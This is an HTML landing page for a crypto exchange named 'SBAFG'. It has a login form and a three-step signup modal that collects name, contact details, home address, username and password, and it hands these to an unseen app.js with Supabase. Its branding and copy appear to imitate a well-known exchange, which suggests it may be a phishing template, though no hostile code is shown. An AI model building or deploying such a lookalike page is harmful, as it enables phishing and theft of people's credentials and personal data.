<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="SBAFG is the most trusted place to buy, sell, and use cryptocurrency.">
    <title>SBAFG - Live Crypto Prices</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 24px; color: #121212; background-color: #f7f9fc; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 48px; }
        .logo-container { display: flex; align-items: center; gap: 10px; }
        .logo-design { width: 28px; height: 28px; background-color: #0052FF; border-radius: 6px; }
        .logo-text { font-size: 28px; font-weight: bold; color: #0052FF; }
        .header-buttons { display: flex; align-items: center; gap: 16px; }
        .log-in-btn-header { background: transparent; border: none; color: #0052FF; font-weight: bold; font-size: 16px; padding: 10px; cursor: pointer; }
        .sign-up-btn-header { background-color: #0052FF; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .main-content { max-width: 500px; margin: 0 auto; text-align: center; }
        .main-content h1 { font-size: 48px; font-weight: 700; margin-bottom: 16px; }
        .main-content p { font-size: 20px; color: #5d6a7e; margin-bottom: 32px; }
        .email-label { font-weight: bold; display: block; margin-bottom: 8px; font-size: 14px; text-align: left; }
        .email-input { width: 100%; padding: 16px; border: 1px solid #dcdcdc; border-radius: 4px; font-size: 16px; margin-bottom: 16px; box-sizing: border-box; }
        .sign-up-btn-main { background-color: #0052FF; color: white; border: none; padding: 16px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
        .modal-content { background-color: #fff; padding: 30px; border-radius: 8px; width: 90%; max-width: 500px; position: relative; }
        .modal-close-btn { color: #aaa; position: absolute; top: 10px; right: 20px; font-size: 28px; font-weight: bold; cursor: pointer; }
        .modal-content h2 { margin-top: 0; margin-bottom: 24px; text-align: center; }
        .modal-form label { display: block; margin-bottom: 8px; font-weight: 600; text-align: left; }
        .modal-form input { width: 100%; padding: 12px; margin-bottom: 16px; border-radius: 4px; border: 1px solid #dcdcdc; box-sizing: border-box; }
        /* MODIFIED: Styles for multi-step form */
        .signup-step { display: none; }
        .signup-step.active-step { display: block; }
        .modal-progress-bar { display: flex; justify-content: space-between; margin-bottom: 20px; gap: 5px; }
        .progress-step { flex-grow: 1; height: 6px; background-color: #e0e0e0; border-radius: 3px; }
        .progress-step.completed { background-color: #0052FF; }
        .modal-form-navigation { display: flex; justify-content: space-between; margin-top: 20px; }
        .nav-btn { background-color: #0052FF; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .nav-btn.prev-btn { background-color: #e0e0e0; color: #121212; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo-container">
            <div class="logo-design"></div>
            <div class="logo-text">SBAFG</div>
        </div>
        <div class="header-buttons">
            <button class="log-in-btn-header" id="header-login-btn">Log in</button>
            <button class="sign-up-btn-header" id="header-signup-btn">Sign up</button>
        </div>
    </header>

    <main class="main-content">
        <h1>The future of money is here</h1>
        <p>We're the most trusted place for people and businesses to buy, sell, and use crypto.</p>
        <form>
            <label for="email" class="email-label">Email address</label>
            <input type="email" id="email" class="email-input" placeholder="satoshi@nakamoto.com">
            <button type="submit" class="sign-up-btn-main" id="main-signup-btn">Get started</button>
        </form>
    </main>

    <div id="signup-modal" class="modal">
        <div class="modal-content">
            <span id="signup-close-btn" class="modal-close-btn">&times;</span>
            <h2>Create your account</h2>
            
            <div class="modal-progress-bar">
                <div class="progress-step" data-step="1"></div>
                <div class="progress-step" data-step="2"></div>
                <div class="progress-step" data-step="3"></div>
            </div>

            <form id="signup-form" class="modal-form">
                <div class="signup-step" data-step="1">
                    <label for="modal-fullname">Full Name</label>
                    <input type="text" id="modal-fullname" required>
                    <label for="modal-email">Email</label>
                    <input type="email" id="modal-email" required>
                    <label for="modal-phone">Phone Number</label>
                    <input type="tel" id="modal-phone" required>
                </div>
                <div class="signup-step" data-step="2">
                    <label for="modal-address">Address</label>
                    <input type="text" id="modal-address" required>
                    <label for="modal-city">City</label>
                    <input type="text" id="modal-city" required>
                    <label for="modal-state">State</label>
                    <input type="text" id="modal-state" required>
                </div>
                <div class="signup-step" data-step="3">
                    <label for="modal-zip">Zip Code</label>
                    <input type="text" id="modal-zip" required>
                    <label for="modal-username">Desired Username</label>
                    <input type="text" id="modal-username" required>
                    <label for="modal-password">Desired Password</label>
                    <input type="password" id="modal-password" required>
                </div>

                <div class="modal-form-navigation">
                    <button type="button" id="prev-btn" class="nav-btn prev-btn">Previous</button>
                    <button type="button" id="next-btn" class="nav-btn">Next</button>
                    <button type="submit" id="create-account-btn" class="nav-btn">Create Account</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="login-modal" class="modal">
        <div class="modal-content">
            <span id="login-close-btn" class="modal-close-btn">&times;</span>
            <h2>Welcome Back!</h2>
            <form id="login-form" class="modal-form">
                <label for="login-email">Email</label>
                <input type="email" id="login-email" required>
                <label for="login-password">Password</label>
                <input type="password" id="login-password" required>
                <button type="submit" class="sign-up-btn-main">Log in</button>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="app.js"></script>
</body>
</html>
